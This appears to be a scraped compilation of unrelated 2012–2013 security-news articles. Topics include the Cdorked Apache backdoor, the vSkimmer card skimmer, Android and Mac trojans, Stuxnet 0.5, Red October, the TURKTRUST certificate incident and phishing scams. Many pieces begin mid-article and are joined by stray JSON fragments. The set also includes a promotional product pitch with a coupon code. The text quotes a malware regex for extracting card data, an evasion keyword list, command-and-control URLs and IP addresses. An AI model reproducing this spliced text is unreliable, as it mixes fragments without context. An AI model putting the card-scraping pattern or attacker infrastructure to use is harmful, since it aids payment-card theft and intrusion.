Researchers claimed that this backdoor affecting hundreds of web servers right now. Dubbed Linux/Cdorked.A, one of the most sophisticated Apache backdoors we have seen so far. The backdoor leaves no traces of compromised hosts on the hard drive other than its modified httpd binary, thereby complicating forensics analysis. All of the information related to the backdoor is stored in shared memory. The configuration is pushed by the attacker through obfuscated HTTP requests that aren't logged in normal Apache logs. The HTTP server is equipped with a reverse connect backdoor that can be triggered via a special HTTP GET request. This means that no command and control information is stored anywhere on the system. ESET researchers analyzed the binary and discovered a nasty hidden backdoor. In the Linux/Cdorked binary all the important or suspicious strings are encrypted and analysed version contains a total of 70 strings that are encoded this way. The backdoor will check if the URL, the server name, or the referrer matches any of the following strings : ‘*adm*’, ‘*webmaster*’, ‘*submit*’, ‘*stat*’, ‘*mrtg*’, ‘*webmin*’, ‘*cpanel*’, ‘*memb*’, ‘*bucks*’, ‘*bill*’, ‘*host*’, ‘*secur*’, ‘*support*’. This is probably done to avoid sending malicious content to administrators of the website, making the infection harder to spot. Researchers also found 23 commands in Linux/Cdorked.A that can be sent to the server via a POST to a specially crafted URL ie. command list : ‘DU’, ‘ST’, ‘T1′, ‘L1′, ‘D1′, ‘L2′, ‘D2′, ‘L3′, ‘D3′, ‘L4′, ‘D4′, ‘L5′, ‘D5′, ‘L6′, ‘D6′, ‘L7′, ‘D7′, ‘L8′, ‘D8′, ‘L9′, ‘D9′, ‘LA’, ‘DA’.

According security researchers at McAfee vSkimemr appeared in the underground forum since February and it could be an ongoing project. vSkimmer appears more sophisticated of Dexter despite it is easier to use, vSkimmer is an advanced tool to steal credit card data from Windows hosts. Exactly as its predecessor Dexter, vSkimmer is completely undetectable on the compromised host. vSkimmer waits for a named USB device to be attached to the compromised machine and once detected it the malware dumps the collected data to the removable device. “vSkimmer can also grab the Track 2 data stored on the magnetic strip of the credit cards. This track stores all the card information including the card number.” To be precise on Track 2 was stored card number, three-digit CVV code, and expiration date are stored, all necessary to qualify card in payment processes. On credit card information grabbing the post states: “VSkimmer maintains the whitelisted process, which it skips while enumerating the running processes on the infected machine.Once vSkimmer finds any running process not in the whitelist, it runs OpenProcess and ReadProcessMemory to read the memory pages of the process and invokes the pattern-matching algorithm to match the regular expression “?[3-9]{1}[0-9]{12,19}[D=\\\\u0061][0-9]{10,30}\\\\??”)” and extract the card info read by the payment devices. This is done recursively for every process running in the infected machine and not on the whitelist.” VSkimmer demonstrated the great interest of cyber crime in payments sector institutions have already been attacked in the past by malicious code such as Zeus and SpyEye and this case is just “another example of how financial fraud is actively evolving and how financial Trojans were developed and passed around in the underground community.” This botnet is particularly interesting because it directly targets card-payment terminals running Windows,” Shah explained in his post, I found really interesting the fact that the offer of similar malware in the underground is increasing and their model of sale is reaching level of excellence never seen first ... we face difficult times." }

This is the first documented attack that targets Android smartphones. Security researchers at Kaspersky say they've found a targeted malware attack on Android phones that seems to come from China. The attack relied heavily on social engineering, a kind of verbal manipulation, to hack into their targets’ devices. Malware seeks to steal information like contacts, call logs, and SMS of people who work in the field of human rights. Kaspersky has identified the Trojan as \"Chuli,\" after a command function that shows up prior to posting stolen data to the command-and-control server at the URL: hxxp://64.78.161.133/*victims's_cell_phone_number*/process.php. On March 24, the attackers infiltrated the email account of a high-profile Tibetan activist, and used that account to send a spear-phishing email to their contacts list. Once the victim opens the attachment on her Android phone, the file installs an application called \"conference\" that will display some information about the Geneva conference. As the target is reading the message, malicious software they had inadvertently installed would report back to a command-and-control server, before collecting information from the phone. Kaspersky also had a warning for future evolution in attack strategy: “So far, attackers relied entirely on social engineering to infect the targets. History has shown us that, in time, these attacks will use zero-day vulnerabilities, exploits or a combination of techniques.”" }

The state-run Korea Information Security Agency said that Screens went blank at 2 p.m. and more than seven hours later some systems were still down. The take down was apparently not from a distributed denial-of-service (DDOS) attack, but a virus that has apparently infected machines in these organizations and delivered its payload simultaneously. An official at the Korea Communications Commission said investigators speculate that malicious code was spread from company servers that send automatic updates of security software and virus patches. The Associated Press says: \"The latest network paralysis took place just days after North Korea accused South Korea and the U.S. of staging a cyber attack that shut down its websites for two days last week. Loxley Pacific, the Thailand-based Internet service provider, confirmed the North Korean outage but did not say what caused it. \"The South Korean shutdown did not affect government agencies or potential targets such as power plants or transportation systems, and there were no immediate reports that bank customers' records were compromised, but the disruption froze part of the country's commerce.\" The Korea Internet Security Agency, a state watchdog, said it had recorded 40,000 cases of cyber attacks from foreign and domestic sources in 2012, up sharply from 24,000 in 2008. Some banking services, such as ATM and online banking, were adversely affected by the shutdowns, though the banks are reporting that those services have been restored. South Korean President Park Geun Hye has put together a cyber security team to look into whether North Korea is the culprit behind today’s attacks." }

Most interesting one was MS13-027, which is rated as \"important\" because the attack requires physical access to the vulnerable machine. This flaw allows anyone with a USB thumb drive loaded with the payload to bypass security controls and access a vulnerable system even if AutoRun is disabled, and the screen is locked. Flaw exposes your Windows PCs to major risk. If you remember Stuxnet, worm was injected to Iran's nuclear program system using USB thumb drive. Windows typically discovers USB devices when they are inserted or when they change power sources (if they switch from plugged-in power to being powered off of the USB connection itself). To exploit the vulnerability an attacker could add a maliciously formatted USB device to the system. When the Windows USB device drivers enumerate the device, parsing a specially crafted descriptor, the attacker could cause the system to execute malicious code in the context of the Windows kernel. Because the vulnerability is triggered during device enumeration, no user intervention is required. In fact, the vulnerability can be triggered when the workstation is locked or when no user is logged in, making this an un-authenticated elevation of privilege for an attacker with casual physical access to the machine. Microsoft admits the flaw could \"open additional avenues of exploitation that do not require direct physical access to the system,\" once the USB-based exploit is successful. The vulnerabilities addressed by Microsoft do not include those exploited by security researchers at the recent Pwn2Own hacking competition at the CanSecWest Conference in Vancouver." }

The attacker strategy was to destroy the nuclear plant causing an explosion due the sabotage of gas valves, hackers purpose was physical destruction of the targets, due this reason the press and security community labeled Stuxnet as first cyber weapon of the history. Francis deSouza, Symantec’s president of products and services, during an interview with Bloomberg revealed that the version detected was a sort of beta version of the final weapon and that in the period between 2005 and 2009 the authors were testing its capabilities. “It looks like now the weapon tried a few things before it hit on what would actually work,”‘ “It is clear that this has been a sophisticated effort for longer than people thought.” Said deSouza. Symantec experts have found in the code of earlier version of Stuxnet a version reference 0.5 and crossing this information with date of website domain registration Stuxnet 0.5 concluded that it may have been used as early as 2005 until July 4th, 2009, few days before the version 1.001 was created. Symantec report revealed the differences of version 0.5 with subsequent ones of Stuxnet, later versions significantly increased their spreading capability exploiting an increased number of vulnerabilities, but has described before the most important change is related to the strategy pursued by the attackers moved their attention from gas valve disruption to centrifuge speed modification. The discovery is intended to reveal many other interesting backstage, let’s think to the link between Flame and Stuxnet, until now security community believed that authors have had access to Flame components but not to whole Flame Platform source code. The discovery of Stuxnet 0.5 demonstrates that its authors had access to the complete Flamer platform source code. Following the statements proposed on the topic in the report: “Stuxnet 0.5 is partly based on the Flamer platform whereas 1.x versions were based primarily on the Tilded platform. Over time, the developers appear to have migrated more towards the Tilded platform. The developers actually re-implemented Flamer platform components using the Tilded platform in later versions. Both the Flamer and Tilded platform code bases are different enough to suggest different developers were involved.”" }

Due its flexibility the malware has been re-engineered several times by cyber criminals that adapted its structure to specific purposes and context, leaving unchanged its core capabilities of stealing banking credentials of victims. Zeus has been a huge success in the criminal circles especially for the sales model, as malware as service, implemented by its authors on many underground sites, let’s remind for example the Citadel Trojan one of the most popular on the crimeware market. Fortunately its author, known as Aquabox, has been banned from a large online forum that sells malware and other services to cyber criminals, but many security firms consider Citadel Trojan still very active threat that continues to infect many machines all over the world. Security experts from McAfee Labs are sure that the agent will remain active for a long time, it also indicate that some groups of hackers are staring to use the malware for other purposes such as the cyber espionage. McAfee Global Threat Intelligence report indicates the “Poetry Group” is one of the most active in this sense, the collective compromised 27 Japanese government offices across three distinct campaigns and targeted around 43 government offices in Poland. The group was very aggressive in October 2012 when it conducted more than a half-dozen campaigns infecting victims in Poland, Denmark, Sweden, Spain, Netherlands, Estonia, Czech Republic, Switzerland, and Japan, compromising more than 1,000 victims worldwide. The researchers from McAfee Labs were able to pinpoint the regions “and identify targets and victims spanning more than a half-dozen campaigns”, the highest infection rate were registered in Denmark, Poland, Spain and Japan.Curiously Japan is one of the most targeted countries by cyber espionage campaign, in many cases we have spoken about cyber attacks malware based that hit industry and government offices of the state. The victims located in Poland appears to be all government offices and the exerts discovered that attackers conducted a targeted campaign on specific targets across the country from December 2012 to January 2013. Nice the way the hackers used to “identify” their works, they in fact added strings of poetry in the malware binary, Ryan Sherstobitoff, a McAfee researcher declared: \"We've found them making political statements against the groups they are targeting,\" McAfee analysts detected more that 300 unique Citadel Trojan samples, each of them included its sequence of poetry strings that aren’t automatically generated , the specialists suspect that Poetry Group may be a byproduct of a for-hire data-gathering operation for a private clientele. In the fight against malware such as Citadel it is fundamental a layered approach that was able to detect the cyber threats and also any suspect behavior within target networks. In many cases such malware are demonstrated to be able to elude common antivirus systems and their behavioral detection mode. Unfortunately these agents are able to remain silently for a long period infiltrating internal systems and remaining undetected in the target networks for long time. The adaptation of the Citadel malware for other uses is a scaring signal due the capabilities of the malicious agent, the Trojan make possible remote control of victims and is able to steal any kind of information, not only banking credentials from victims. Sherstobitoff added: \"If they wanted to penetrate the entire network of a financial institution or some other organization, they could,\" Waiting for further updates on the operations of the Poetry Group lets keep update antivirus software and any other application that runs on our systems, because as Sherstobitoff added \"These attacks result from not taking patch management seriously,\"." }

This backdoor Trojan can be used to conduct distributed denial of service (DDoS) attacks, or it can be used to install additional Trojans or other forms of malicious software. Since the connection between the hacker and the machine is encrypted, it becomes very hard for the Trojan to be detected or traced. The threat has the potential to become serious, as it uses an exploit in OS X to bypass Gatekeeper and establish a reverse shell that creates a secure connection. Trojan stays hidden by disguising itself as a file that is used for networked printers in Mac OS X. The location of the malware has been traced to this particular directory. This tactic conceals the Trojan and makes a monitor think that a printer is seeking access to the network.

BlackBerry Enterprise Server (BES) users have been warned that an image-based exploit could allow hackers to access and execute code on the servers used to support corporate users of BlackBerry smartphones. The flaw that been rated as high severity and actual vulnerability in BlackBerry Enterprise Servers resulted from how the server processes image files. Scenario to Exploit Vulnerability : A malicious person writes a special code and then embeds it in a TIFF image file. The person then convinces a Blackberry smart phone user (whose phone is connected to a corporate BES) to view the TIFF file. As soon as the image file loads on the phone, the code runs on the Blackberry Enterprise server and either opens up a back door in the network or causes the network to crash altogether as instructed in the basic code. “RIM is not aware of any attacks on or specifically targeting BlackBerry Enterprise Server customers, and recommends that affected customers update to the latest available software version to be fully protected from these vulnerabilities.” Blackberry said. The exploit uses a TIFF image containing malicious code, and the dangerous image can either be linked to an email or attached directly to it. Depending on the privileges available to the configured BlackBerry Enterprise Server service account, the attacker might also be able to extend access to other non-segmented parts of the network.

We have assisted in the recent year to an explosion of malware designed to hit principal mobile OSs, in a recent report Sophos security firm revealed that in Australia and the U.S. Android threat exposure rates exceeding those of PCs showing the urgency to implement proper countermeasures. The situation appears really critical that why I asked to the expert of Group-IB Forensics Lab to show me how these agents work with a really case study. Several month ago Group-IB Forensics Lab detected mobile-banking malware through Google Play by Sberbank request (Russian leading national bank). The File associated to the malware was named sber.apk, it was an Android Package having size of 225,905 bytes and digest md5: F27D43DFEEDFFAC2EC7E4A069B3C9516. Analyzing the functionality of the agent is is possible to classify it as SMSStealer.APK designed to infect Android devices. The first step is the decompression of the archive and subsequent conversion of the file with the name classes.dex from format dex to file format Jar, subsequently using Java Decompiler it is possible to convert files. Evidence files after installation displays the following graphical user interface used to request user’s authorization through a phone number verification process. After entering the phone number and pressing the «Do authorization» the application send system information to a remote server URL http:// berstaska.com/m/fo125kepro The data sent contains mobile phone number, the name and version of the operating system on a mobile phone, the name of the service provider, mobile country code and many others. At this point the research was addressed to the malicious domain used to collect the info, “berstaska.com” and “lekerdeka.com” are known to security experts because they have been used in the past for placing Carberp malware. The data related to the domains are: Domain Name: BERSTASKA.COM Registrant: N/A merab mekokayan (gooddoctor222289@yahoo.com) sk 8 box18 NY ,334777 US Tel. +1.3049583484 Creation Date: 26-Oct-2012 Expiration Date: 26-Oct-2013 Domain servers in listed order: dc1.nserver.ru dc2.nserver.ru Domain Name: LEKERDEKA.COM Registrant: N/A Sergey Bezumov (gooddoctor222299@yahoo.com) PU BOX 81 l 92 NY ,325236 US Tel. +1.33873847374 Creation Date: 26-Oct-2012 Expiration Date: 26-Oct-2013 Domain servers in listed order: dc1.nserver.ru dc2.nserver.ru Both domain names were linked to nserver.ru NS-servers and registered anonymously, according to the MalwareURL database and Group-IB Bot-Trek™ product more than twenty Carberp C&C were linked through the DNS of this operator. At the time of the study network address «berstaska.com» was unavailable. The malware establishes the function for sending and receiving SMS-messages using the following event handler: Received messages are processed and stored in the appropriate format in a file called messages.txt and can be sent to the above remote server. In this program makes logging investigated their actions in a file called alarms.txt. The scam schema based on the interception of SMS used in the authentication process could be very useful to banking frauds. US and Canada banks, but also other financial institutions, use One Time Password token sent via SMS, clearly an attacker intercepting it could complete fraudulent transactions. Many security firms such as Group-IB have observed that hackers begin to trade such kind of tools on black market customized for specific banks. Group-IB has developed unique solution for proactive prevention fraud without integration specific hardware or software to the banking server-side so called Botnets Intelligence. Group-IB Botnets Intelligence team does sink holing of botnet to collect the data from them, information that the expert provide to the bank for blocking the banking accounts victims of frauds notifying to the customer the incident. Following some questions I made to the experts of Group-IB Lab What information exactly sent by the app to the remote server? \"system information, containing a mobile phone number, the name of the operating system on a mobile phone, the name of the service provider, mobile country code, etc\" Is the phone identifier sent? Android version number? any personal data? any information about other apps already installed on the device? Information about IMEI, Android version, mobile service provider and extracted cellphone number from SIM-card for identifying the victims. How often is messages.txt sent to the remote server? Is the messages.txt file created as soon as a SMS arrives, and then sent to the server? Or does the messages.txt created a file with multiple messages, and then send it at a specified time? It sends intercepted SMS as soon as it was intercepted by the Trojan or it would be impossible to use such technique efficiently for banking theft, as you need to know the intercepted SMS and to login to the victims banking account. If you do it late, you need to wait for other chance. Is the Trojan intercepting all SMS messages, or just bank-related? Only bank related by special signatures from Sberbank (Russian national bank) and Alfabank (http://alfabank.ru) - one of the largest and leading private bank in Russian Federation. I am not clear from the code snippet what is inside alarms.txt. Is it just logging when SMS are received and when messages.txt is transferred? Yes, you are right, it is special files for information exchange about the new SMS was got and you don't need to send it once again to the hacker. How different is this from what Zeus-in-the-mobile does? It doesn't do any active actions with online-banking, as some of mobile banking trojans do. It only intercepts the information from SMS to do future theft from the remote computer of the hacker. Did the two banking apps (for the different banks) all use the same remote server? No, the same server was used to 2 banks, as it seems to be that it was targeted attack on them, and the same team of hackers were interested in both of them. Let me conclude the article thanks the experts of Group-IB Forensics Lab and in particular to the Head of International projects Andrey Komarov." }

Some unknown malware infected two power plants control systems using unprotected USB drives as an attack vector. The tainted USB drive came in contact with a handful of machines at the power generation facility and investigators found sophisticated malware on two engineering workstations critical to the operation of the control environment. The report did not say if the computers did or did not have up-to-date antivirus software, but it did say that current software would have found the malware. The other infection affected 10 computers in a turbine control system. It was also spread by a USB drive and resulted in downtime for the impacted systems and delayed the plant restart by approximately three weeks. ICS-CERT recommended that the power facility adopt new USB use guidelines, including the cleaning of a USB device before each use." }

A new large scale cyber-espionage operation has been discovered, named Red October, name inspired by famous novel The Hunt For The Red October (ROCRA) and chosen because the investigation started last October. The campaign hit hundreds of machines belonging to following categories: Government Diplomatic / embassies Research institutions Trade and commerce Nuclear / energy research Oil and gas companies Aerospace Military The attackers have targeted various devices such as enterprise network equipment and mobile devices (Windows Mobile, iPhone, Nokia), hijacking files from removable disk drives, stealing e-mail databases from local Outlook storage or remote POP/IMAP server and siphoning files from local network FTP servers. According security experts involved in the investigation the cyber-espionage campaign was started since 2007 and is still active, during this long period the attackers obtained a huge quantity of information such as service credentials that hav been reused in later attacks. The control structure discovered is very complex and extended, more than 60 domain names and several server hosting located in many countries mainly Germany and Russia. A particularity of the C&C architecture is that the network is arranged to hide the mothership-server true proxy functionality of every node in the malicious structure. Security experts were able to sinkhole six of the 60 domains used during the period 2 Nov 2012 - 10 Jan 2013, registering over 55,000 connections to the sinkhole from 250 different victim’s IPs from 39 different countries, with most of IPs being from Switzerland. Kazakhstan and Greece follow next. Red October Geo-distribution of victims Which are the vulnerabilities exploited for the attacks? The security expert discovered that at least three different known vulnerabilities have been exploited CVE-2009-3129 (MS Excel) [attacks dated 2010 and 21011] CVE-2010-3333 (MS Word) [attacks conducted in the summer of 2012] CVE-2012-0158 (MS Word) [attacks conducted in the summer of 2012] Evidences collected during the investigation let security specialists to believe that attackers have Russian origins, but strangely they appear unrelated to any other cyber attacks detected until now. The exploits appear to have been created by Chinese hackers. Attack Method These attacks is structured in two distinct phases according a classic schema of targeted attacks: Initial infection Additional modules deployed for intelligence gathering In the initial phase the malware is delivered via e-mail as attachments (Microsoft Excel, Word and, probably PDF documents), once victims opened the malicious document the embedded malicious code initiated the setup of the main component which in turn handled further communication with the C&C servers, after the malware receives from the C&C server a number of additional spy modules. The way to infect entire network is very efficient, the hackers used a module to scan target infrastructure searching for vulnerable machines. The attacks against each machine and related services is made exploiting the above vulnerabilities or gaining access to it using credentials collected during other attacks of the same campaign. The exploits appear to have been created by Chinese hackers. What alarms me is that such campaigns could be going on for years with disastrous consequences ... what to do at this point? How is it possible that an operation so extended escape for so long to world wide security community? Who is behind the attacks? Cyber criminals or state-sponsored hackers? UPDATE 2013/01/15 Jeffrey Carr, founder and CEO of Taia Global, Inc, posted on his blog The developers behind ROCRA, who are Russian, are comfortable using Chinese malware and adapting it for their own use according to the Kaspersky report. This fits the RBN profile to a ‘t’. I ran 13 IPs listed in Kaspersky’s report against the RBN list maintained by James McQuade and found matching IP blocks for five of them: Malicious servers 178.63.208.49 matches to 178.63. 188.40.19.247 matches to 188.40. 78.46.173.15 matches to 78.46. 88.198.30.44 matches to 88.198. Mini-motherships 91.226.31.40 matches to 91.226. It has been my belief for many years that the RBN has a working relationship with the Russian government; that it disappeared from view when the FBI sought the assistance of the FSB to shut down their operations in 2007 (as detailed in chapter 8 of my book); and that it has continued operating below the radar all this time. It provides distance and deniability to the FSB for certain offensive cyber operations and, in exchange, the FSB allows the RBN to operate as a criminal enterprise; a portion of which involves selling the data that it steals to whomever is interested.Red October is already the most significant find of the new year. If, in fact, Kaspersky has uncovered an RBN-controlled espionage ring, it’s going to be one of the most important discoveries of the decade." }

Using the certificate it is possible to spoof content in a classic phishing schema or perform a man-in-the-middle attack according Google Chrome Security Team and Microsoft experts. Microsoft has been immediately started the procedure to update its Certificate Trust list (CTL) and all versions of its OSs to revoke the certificate. Microsoft has also decided to revoke other two certificates for the same reason, it seems that some attacks using the first certificate have been already detected, fraudulent digital certificate that was mistakenly issued by a domain registrar run by a Turkish domain registrar. Microsoft has issued a security advisory “Microsoft Security Advisory (2798897) -Fraudulent Digital Certificates Could Allow Spoofing” that states: “Microsoft is aware of active attacks using one fraudulent digital certificate issued by TURKTRUST Inc., which is a CA present in the Trusted Root Certification Authorities Store. This fraudulent certificate could be used to spoof content, perform phishing attacks, or perform man-in-the-middle attacks. This issue affects all supported releases of Microsoft Windows. TURKTRUST Inc. incorrectly created two subsidiary CAs (*.EGO.GOV.TR and e-islem.kktcmerkezbankasi.org). The *.EGO.GOV.TR subsidiary CA was then used to issue a fraudulent digital certificate to *.google.com. This fraudulent certificate could be used to spoof content, perform phishing attacks, or perform man-in-the-middle attacks against several Google web properties. To help protect customers from the fraudulent use of this digital certificate, Microsoft is updating the Certificate Trust list (CTL) and is providing an update for all supported releases of Microsoft Windows that removes the trust of certificates that are causing this issue.” It’s still unknown which is the real target of attack neither their geographic distribution, Microsoft advisory refers the domain kktcmerkezbankasi.org a web site that present itself as the Central Bank of the Turkish Republic of Northern Cyprus (TRNC). Google On-Line Security Blog published a blog post that reported that on Dec. 24, 2012, its Chrome Web browser detected and blocked an unauthorized digital certificate for the “*.google.com” domain. The post states: “We investigated immediately and found the certificate was issued by an intermediate certificate authority (CA) linking back to TURKTRUST, a Turkish certificate authority. Intermediate CA certificates carry the full authority of the CA, so anyone who has one can use it to create a certificate for any website they wish to impersonate. In response, we updated Chrome’s certificate revocation metadata on December 25 to block that intermediate CA, and then alerted TURKTRUST and other browser vendors. TURKTRUST told us that based on our information, they discovered that in August 2011 they had mistakenly issued two intermediate CA certificates to organizations that should have instead received regular SSL certificates.” In a blog post published a In 2011 I explained which is the usefulness to steal a CA certificate: Malware production - Installation for certain types of software could needs that its code is digitally signed with a trusted certificate. By stealing the certificate of a trusted vendor reduces the possibility that the malicious software being detected as quickly. That is exactly what happend for Stuxnet virus. Economic Frauds - digital signature give a warranty on who signed a document and you can decide if you trust the person or company who signed the file and if you trust the organization who issued the certificate. If a digital certificate is stolen we will suffer of an identity theft, let’s imagine which could be the implication. Some bot, like happened for the banking with Zeus malware, could be deployed to steal steal site certificates so that they can fool web browsers into thinking that a phishing site is a legitimate bank web site. Cyber warfare - Criminals or governments could use the stolen certificates to conduct “man-in-the-middle” attacks, tricking users into thinking they were at a legitimate site when in fact their communications were being secretly tampered and intercepted. That is for example what occurred in the DigiNota case … companies like Facebook, Google and also agencies like CIA, MI6 were targeted in Dutch government certificate hack. The security repercussions are very critical, any attacker with the possibility to sign using a certificate of a CA can sign certificates for any domain. In the past we have already observed similar incidents, such as the case of Diginotar CA, learning how much dangerous is the impairment of a CA. Who will be next?" }

This Pro is the best remote malware remediation product we've seen. It retails for $299.99 per year, or $209.99 for the first 50 'The Hacker News' readers (use coupon code 'THNFIX' for 30% Discount), and can be used an unlimited number of times on an unlimited number of PCs per year. The price is per year because the FixMeStick contains three anti-virus engines licensed from three anti-virus companies keeping three malware definition databases up to date etc... Finds: Three anti-virus engines working together to find the widest range of infections. Removes: ‘Computer on a stick’ architecture provides a separate and clean operating system to fix Windows operating systems. Delivers: Highest confidence remediation. Remote Access: Remote access independent of the host operating system, i.e. out-of-band remote management, like a remote access card for PCs. Easy-to-use The FixMeStick® is a Linux-based device that runs before Windows boots enabling it to remove infections without the infection being able to block it. Contains a built-in multi-scanner composed of three anti-virus engines: Kaspersky Lab®, Sophos®, and GFI’s VIPRE®. The technology is integrated behind a single full-screen application (the user can use CTRL-T to launch a terminal). The FixMeStick is set-up and ready to go right out of the box. No additional installation or downloading is required. Any user can start with 2 steps: 1- insert key, and 2- double-click \"Run FixMeStick\". Automatic updates are fetched and stored directly on the FixMeStick. Easy to support: Any removal operation is 100% reversible with the click of a button. Systems supported: Any PC; A minimum of 512 MB of RAM. Bootability: The FixMeStick uses a bootloader menu system to provide multiple boot configuration options, one of which will work on essentially any PC (as of December 2012). Detection, Cleaning, Quarantine: Three anti-virus scanners provide the super-set of all three scanners’s detections. Each scanner is loaded into RAM, and files are fetched from disk once and passed to each scanner in parallel. The result is a scan time on par with desktop “on-demand” full system scans. Only if each of the scanners fail to clean an infected file is that file quarantined. Connectivity: The FixMeStick automatically seeks an Internet connection when it starts. It has built-in Ethernet drivers that support essentially all PC Ethernet hardware. It also contains built-in WiFi drivers that support most PC WiFi hardware. If the FixMeStick is booted from Windows (versus directly from the BIOS) the FixMeStick will automatically use the default WiFi SSID and password active on the Windows operating system (except on Vista). If an auto-connection is not possible the user can select their network from the WiFi picker that is displayed within FixMeStick. Once a connection is established, the FixMeStick downloads program and malware definition updates and stores them on the FixMeStick. The FixMeStick will work without a network connection, but it won’t be able to fetch the latest malware definition updates. Authentication: Each FixMeStick has a unique serial number in its firmware. This serial number identifies the FixMeStick to the FixMeStick Management Server. Each FixMeStick also has a tag etched into its outside. This unique tag maps to the unique serial number in the FixMeStick Management Server. Users identify their specific FixMeStick unit to their solution provider (or FixMeStick technical support) by providing this tag. Remote Remediation: FixMeStick Management Server has a record of every FixMeStick’s usage (for users who have permitted this information retrieval). This usage information includes: Scan start timestamp Scan end timestamp An endpoint identifier (e.g. answers the question “which PC is this scan from?”) FixMeStick serial number, tag, and comment (text field that can be written by the solution provider to, for example, identify the primary owner\\user of the FixMeStick) The version of the FixMeStick software Number of files scanned Number of files total on the PC Number of malware found The name and path to the malware found Each FixMeStick also contains a TeamViewer® client. The FixMeStick user enters the key-combination “CTRL-ALT-R” and the TeamViewer client will display. The user provides the endpoint id and passcode to the solution provider, and the solution provider can remotely login to the FixMeStick, i.e. login to the Ubuntu-based operating system that is FixMeStick, from which they can manage the local device. If you want to check it out you can go to their website, and contact them directly with any technical questions you may have. Don't forget to use the coupon THNFIX to get the 30% discount on the Pro if you're interested in buying." }

But the fact is no matter what time of year it is there are always going to be bad guys around every corner and they will try to stalk their prey at anytime. It does not matter what time of year it is, the bad guys like to work all year round and you always have to be on the lookout for them. As a matter of fact this time of year is a very good time when it comes to black hat hackers. This is because there are so many people online around this time and they are looking for a bunch of deals for their Christmas shopping. The retailers really go full throttle around this time of year and they want to be able to make as much money as they can. This time of year may be known as the holidays to most people but to people in the financial industry it is known as the fourth quarter and it is the most important quarter of the year. They want to be able to make as much money as they can throughout this time period so they will offer deep discounts wherever they can.

With so many emails and so much different types of information being sent back and forth it is hard for the average person to be able to discern what is real and what is not. They do not know which emails are really offering a real deal and which ones are fake and trying to get something out of you. Normally you would tell a person that if a deal seems to be too good to be true that it probably is and there are some bad guys behind the offer. But at this time of year all of the deals seem too good to be true and it is hard to tell which one is a bad deal and which on is a good deal. That is why as a consumer, you have to keep a more vigilant eye out than you normally would. Yes, the bad guys are going to be out there in full force and you have to make sure you are more prepared than ever. When you go to visit websites you have to make sure that the domain is correct and that it matches the website that you thought you were going to. If it does not match the domain that you thought you were going to then you should leave right away without clicking on anything. And if you get an offer in your email account then you should not click the link in the email. What you should do is type the website in directly and go to it that way. You never know where a link in your email account is going to take you. So make sure that you do it the right way so that you know where you are going. When it comes to the holidays the bad guys do not take a day off. So make sure that your common sense does not take a day off as well. Happy Holidays from Team 'The Hacker News'" }

Officials said international cyber crime rings linked to Butterfly (aka Mariposa) botnet, first discovered in December 2008 and shut down a year later, infected over 12 million PCs worldwide and was spread primarily through file-sharing and instant messaging attacks. It also harvested financial information from over 800,000 victims. FBI said, \"Facebook’s security team provided assistance to law enforcement throughout the investigation by helping to identify the root cause, the perpetrators, and those affected by the malware. Yahos targeted Facebook users from 2010 to October 2012, and security systems were able to detect affected accounts and provide tools to remove these threats.\" How Butterfly actually fly ? A botnet is a network of computers that have been infected by a virus that allows a hi-tech criminal to use them remotely. Butterfly botnet spread itself using variants of Yahos (virus that spreads itself by sending links via social networks and instant messaging), then victims clicked on that malicious link, launching Yahos attack. The malware which in some variants disguised itself as an NVIDIA video driver, then downloaded and installed the botnet controls and browser exploits that captured users' credit card and bank account information. Variations on the Yahos malware have been infecting users for years, spreading initially via instant messenger platforms like AIM and Yahoo! messenger. Experts say cybercrime is on the rise around the world as PC and mobile computing become more prevalent, and as more and more financial transactions shift online." }

Spear phishing emails are on the rise because they work. We have notice many times that Spear Phishing Attacks are really Successful in order to compromise Enterprise Networks and Stealing Data. From last one month I was getting mails from an unknown spoofed email id regrading a paypal warning with subject \"Your account has been limited until we hear from you !\" Guess what, even I am not using that email for my Paypal account, from here I just judge that it's a regular spam mail and ignore that most of the time week before. Today I again receive a similar mail, and this time I was amazed to notice a tricky URL given in mail to click, as shown in the screenshot. Cyber criminals start making some very smart spoofed URL in sub domain, that can trick most of the victims ( even me for a second ). Phishing is not just a small-time operation. Phishing is a business, and billions of dollars are being made by criminals while consumers and businesses are left to suffer the consequences. There are gangs of phishers organized all over the world. I was estimating that, if phishers are flooding out 50000 email viewers a day, this trick will surely work on atleast 1 % users = 500 victims, i.e if each have minimum 100 USD in each account, then per day income of an phishing criminal is, $500 x 100 = $50,000 / Day - COOL ? Anyway, I am not counting benefits of being an online criminal :P , coming back to point -- A smart trick to abuse URLs . Tips : 1.) Notice each URL carefully before clicking 2.) Avoid clicking on links or opening attachments in emails from an unknown sender in an attempt to avert phishing Most of the time, people ask - Which is the best security product or Antivirus that can protect them from such malwares, scams or attacks ?

The trojan is apparently being delivered through a website (gyalwarinpoche.com) dedicated to the Dalai Lama and once installed can collect user keystrokes and other personal information. Mac in Danger ? Earlier this spring, a Russian security firm discovered a trojan piece of malware which took advantage of a Java vulnerability on many computers, Macs and PCs alike. This trojan, known as “Flashback,” was used to enlist some 600,000 infected computers into a botnet. Malware also provides an interface that allows attackers to download and execute additional malware. Dockster has been found to use the same exploit code as the previous SabPab virus to gain access through a backdoor. Dockster is also said to launch an agent called mac.dockset.deman, which restarts each time a user logs in to their Mac. Dockster is only the latest Mac-based threat to hit organizations and people sympathetic to Tibet's conflict with the Chinese government. In April, another piece of malware, known as “Backdoor.OSX.SabPub,” or “SabPub” was found and distributed through Microsoft Office files sent to those who may sympathize with Tibet. The attackers behind SabPub used a technique known as “Spear-Phishing,” a practice used to target smaller groups of people as opposed to sending out mass emails in hopes that someone will click a link. In September, security firm AlienVault said it had discovered the creator of the PlugX Remote Access Tool (RAT), which had been used by hackers from various countries to target Tibet.

The malware allows hackers to inject code directly in any infected web page. The new malware, discovered on November 13 of this year, was written especially for servers that run Debian Squeeze and NGINX, on 64 bits. About Rootkit : Rootkit.Linux.Snakso.a is designed to infect the Linux kernel version 2.6.32-5-amd64 and adds an iframe to all served web pages by the infected Linux server via the nginx proxy. Based on research, the rootkit may have been created by a Russia-based attacker. The recently discovered malware is very dangerous because it does not infect a specific website. It infects the entire server and this can endanger all websites hosted on that server. Drive-by-downloads expose web surfers to malicious code that attempt to exploit unpatched software vulnerabilities in the web visitor's PC or handheld. Security holes in web browsers, Java and Flash plugins and the underlying operating system are typical targets. Security researcher Georg Wicherski said that the code does not seem to be a variant of a publicly available rootkit, but a result of \"contract work of an intermediate programmer with no extensive kernel experience\". The malware is also likely to have been customized by the buyer, which introduced critical flaws. The rootkit looks like a work in progress, and contains enough programming rough edges to mark it out as ‘in development’. The malware''s relatively large binary size of 500k, and the inclusion of debug code, is another giveaway that this might be a work in progress." }

